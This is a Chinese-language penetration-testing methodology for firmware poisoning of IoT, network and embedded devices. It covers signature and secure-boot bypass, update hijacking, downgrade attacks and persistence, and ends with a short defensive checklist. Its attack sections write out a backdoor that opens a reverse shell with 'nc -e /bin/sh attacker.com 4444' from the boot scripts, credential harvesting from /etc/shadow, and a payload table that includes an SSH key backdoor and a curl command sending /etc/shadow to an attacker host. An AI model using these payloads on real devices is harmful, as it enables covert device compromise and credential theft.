# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化、可复现的固件投毒（Firmware Poisoning）攻击测试与利用流程。通过本方法论，测试人员能够系统性地检测和利用 IoT 设备、嵌入式系统、网络设备中的固件安全漏洞，包括固件篡改、签名绕过、更新劫持、BootROM 攻击等技术。

## 1.2 适用范围

本文档适用于以下场景：
- IoT 设备（智能家居、工业传感器、摄像头等）
- 网络设备（路由器、交换机、防火墙等）
- 嵌入式系统（医疗设备、汽车电子、工控设备等）
- 移动设备（手机、平板等）
- 硬件安全模块（HSM、TPM 等）

## 1.3 读者对象

本文档主要面向：
- 执行渗透测试任务的安全工程师
- 进行硬件安全评估的顾问
- 负责嵌入式系统安全的技术人员
- 红队成员进行硬件攻击演练

---

# 第二部分：核心渗透技术专题

## 专题一：固件投毒攻击

### 2.1 技术介绍

固件投毒（Firmware Poisoning）是一种针对设备固件的攻击，攻击者通过篡改固件映像，使设备在更新或启动时加载并执行恶意代码。

**攻击原理：**
- **固件篡改：** 修改固件映像中的代码或数据
- **签名验证绕过：** 利用弱签名算法或验证逻辑缺陷
- **安全启动绕过：** 绕过 BootROM/Bootloader 的安全检查
- **更新劫持：** 在固件更新过程中注入恶意代码
- **降级攻击：** 强制设备使用存在漏洞的旧版本固件
- **供应链攻击：** 在固件生产或分发环节植入后门

**本质：** 设备未能正确验证固件的来源真实性和完整性，或安全启动链存在缺陷。

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **智能家居设备** | 智能摄像头、智能门锁 | 固件更新无签名验证 |
| **网络设备** | 路由器、交换机 | Web 管理界面固件上传漏洞 |
| **工业设备** | PLC、传感器 | 固件更新使用明文传输 |
| **医疗设备** | 监护仪、输液泵 | 固件签名算法过时（MD5/SHA1） |
| **汽车电子** | ECU、车载娱乐系统 | OBD 接口固件刷写保护不足 |
| **移动设备** | 手机、平板 | Bootloader 解锁后刷入恶意固件 |
| **存储设备** | NAS、硬盘固件 | 硬盘固件可被恶意刷写 |
| **外设设备** | 键盘、鼠标固件 | USB 设备固件可被重编程 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**固件信息收集：**

1. **识别设备信息**
   ```bash
   # 获取设备信息
   curl http://device-ip/api/system/info
   curl http://device-ip/cgi-bin/system_info.cgi
   
   # 识别固件版本
   nmap -sV device-ip
   ```

2. **下载固件分析**
   ```bash
   # 从官网下载固件
   wget https://vendor.com/firmware/v1.0.bin
   
   # 检查固件格式
   file firmware.bin
   binwalk firmware.bin
   ```

3. **分析固件更新接口**
   ```bash
   # 检查更新接口
   curl http://device-ip/cgi-bin/firmware_update
   curl http://device-ip/api/system/update
   
   # 测试更新请求
   curl -X POST -F "file=@malicious.bin" http://device-ip/upload
   ```

#### 2.3.2 白盒测试

**固件逆向分析：**

1. **固件解包**
   ```bash
   # 使用 binwalk 提取固件内容
   binwalk -e firmware.bin
   
   # 使用 firmwalker 分析
   firmwalker.sh extracted/
   ```

2. **检查签名验证**
   ```bash
   # 查找签名验证相关字符串
   strings firmware.bin | grep -i "signature"
   strings firmware.bin | grep -i "verify"
   strings firmware.bin | grep -i "checksum"
   
   # 查找加密相关函数
   strings firmware.bin | grep -i "md5\|sha1\|sha256\|rsa\|aes"
   ```

3. **分析启动流程**
   ```bash
   # 查找 Bootloader 相关字符串
   strings firmware.bin | grep -i "boot\|uboot\|u-boot"
   
   # 分析启动脚本
   cat extracted/etc/init.d/*
   ```

### 2.4 漏洞利用方法

#### 2.4.1 固件篡改攻击

**步骤 1：解包固件**
```bash
binwalk -e original_firmware.bin
cd _original_firmware.bin.extracted
```

**步骤 2：修改内容**
```bash
# 修改配置文件
echo "backdoor_enabled=true" >> etc/config/system

# 添加后门脚本
cat > usr/bin/backdoor << EOF
#!/bin/sh
nc -e /bin/sh attacker.com 4444
EOF
chmod +x usr/bin/backdoor

# 修改启动脚本
echo "/usr/bin/backdoor &" >> etc/init.d/rcS
```

**步骤 3：重新打包**
```bash
# 根据固件格式重新打包
# 方法因厂商而异，可能需要专用工具
```

#### 2.4.2 签名验证绕过

**方法 1：移除签名检查**
```bash
# 在固件中查找并禁用签名验证代码
# 使用 IDA Pro/Ghidra 分析二进制文件
# 将验证函数的返回值硬编码为 true
```

**方法 2：利用弱哈希算法**
```bash
# 如果固件使用 MD5/SHA1 校验
# 可以使用碰撞攻击生成相同哈希的恶意文件

# 使用 HashClash 进行 MD5 碰撞
hashclash original.bin malicious.bin
```

**方法 3：签名检查旁路**
```bash
# 如果签名存储在单独分区
# 可以只修改应用分区，保留签名分区不变

# 或者在更新过程中替换签名文件
cp original_signature.sig malicious_firmware.sig
```

#### 2.4.3 安全启动绕过

**方法 1：BootROM 漏洞利用**
```bash
# 某些设备的 BootROM 存在已知漏洞
# 如 iPhone 的 checkm8 漏洞

# 利用方式因设备而异
# 通常需要物理访问设备
```

**方法 2：Bootloader 配置篡改**
```bash
# 修改 U-Boot 环境变量
fw_setenv bootcmd 'run bootcmd_backdoor'
fw_setenv bootargs 'init=/bin/sh'

# 或修改 boot.scr
echo "setenv bootargs 'init=/bin/sh'" > boot.scr
mkimage -A arm -T script -C none -n "Boot Script" -d boot.scr boot.scr.uimg
```

#### 2.4.4 更新劫持攻击

**方法 1：中间人攻击**
```bash
# 使用 MITM 工具劫持更新
mitmproxy --mode transparent

# 拦截更新请求并返回恶意固件
```

**方法 2：更新服务器模拟**
```bash
# 修改设备 hosts 文件（如果可能）
echo "192.168.1.100 update.vendor.com" >> /etc/hosts

# 搭建伪造更新服务器
python3 -m http.server 80
```

#### 2.4.5 降级攻击

**攻击步骤：**
```bash
# 步骤 1：获取旧版本固件
wget https://vendor.com/firmware/v1.0.bin

# 步骤 2：修改版本号欺骗设备
# 在更新包中将版本号改为高于当前版本

# 步骤 3：强制设备接受旧版本
# 利用设备缺少最小版本检查
```

#### 2.4.6 信息收集命令

```bash
# 设备信息收集
cat /etc/version
cat /etc/device_info
uname -a

# 硬件信息
cat /proc/cpuinfo
cat /proc/meminfo
dmesg | head -50

# 网络信息
ifconfig
netstat -an
route -n

# 凭证收集
cat /etc/shadow
cat /etc/passwd
find / -name "*.conf" -exec grep -l "password\|passwd" {} \;
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过分区验证

**方法 1：活动分区切换**
```bash
# 某些设备有 A/B 分区
# 修改非活动分区，然后切换

# 修改 B 分区（假设 A 分区当前活动）
mount /dev/mmcblk0p2 /mnt
# 修改 /mnt 中的内容

# 设置 B 分区为活动
fw_setenv active_partition 2
```

#### 2.5.2 绕过看门狗

**方法 1：禁用看门狗**
```bash
# 在启动参数中禁用看门狗
# 修改 bootargs
bootargs=... nowatchdog

# 或者快速喂狗
while true; do echo V > /dev/watchdog; sleep 1; done &
```

#### 2.5.3 绕过加密保护

**方法 1：密钥提取**
```bash
# 从内存转储中提取密钥
# 需要物理访问或 JTAG 调试

# 从固件中提取硬编码密钥
strings firmware.bin | grep -E "^[a-zA-Z0-9+/=]{16,}$"
```

#### 2.5.4 持久化技术

**方法 1：Bootkit 持久化**
```bash
# 修改 Bootloader 植入持久化后门
# 即使固件更新也能存活
```

**方法 2：隐藏分区**
```bash
# 创建隐藏分区存储恶意代码
# 在固件更新时保留该分区
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 类别 | 目标 | Payload 示例 | 说明 |
|-----|------|------------|------|
| **后门脚本** | 反弹 Shell | `nc -e /bin/sh attacker.com 4444` | 建立反向 Shell |
| **后门脚本** | SSH 密钥 | `echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys` | 添加 SSH 后门 |
| **配置篡改** | 启用 Telnet | `echo "telnet stream tcp nowait root /usr/sbin/telnetd" >> /etc/inetd.conf` | 启用 Telnet |
| **凭证窃取** | 外带密码 | `curl -X POST -d @/etc/shadow http://attacker.com/exfil` | 窃取密码哈希 |
| **启动篡改** | init 替换 | 修改 bootargs 为 `init=/bin/sh` | 获取 Shell |

## 3.2 常见固件格式

| 厂商 | 格式 | 工具 |
|-----|------|------|
| **TP-Link** | TP-Link Firmware | binwalk, tplink-firmware-tools |
| **D-Link** | D-Link Firmware | binwalk, dlink-firmware-tools |
| **Netgear** | CHK/TRX | binwalk, netgear-firmware |
| **Linksys** | TRX | binwalk, trx |
| **Xiaomi** | MIOT | miot-tools |
| **Hikvision** | Hikvision | hikvision-firmware-tools |

## 3.3 固件安全检查清单

- [ ] 固件有数字签名
- [ ] 使用强签名算法（RSA-2048+、ECDSA）
- [ ] 安全启动已启用
- [ ] Bootloader 锁定
- [ ] 调试接口已禁用（JTAG、UART）
- [ ] 固件分区有写保护
- [ ] 更新使用 HTTPS
- [ ] 有防降级保护
- [ ] 敏感数据已加密存储
- [ ] 默认凭证已修改

## 3.4 防御建议

1. **安全启动**：启用并正确配置安全启动链
2. **代码签名**：使用强算法对固件签名
3. **加密存储**：对敏感数据进行加密
4. **防降级**：实现最小版本号检查
5. **调试禁用**：禁用生产设备的调试接口
6. **安全更新**：使用 HTTPS 进行固件更新
7. **密钥管理**：安全存储签名密钥
8. **分区保护**：对关键分区启用写保护
9. **监控告警**：监控固件完整性变化
10. **供应链安全**：审计固件供应链各环节
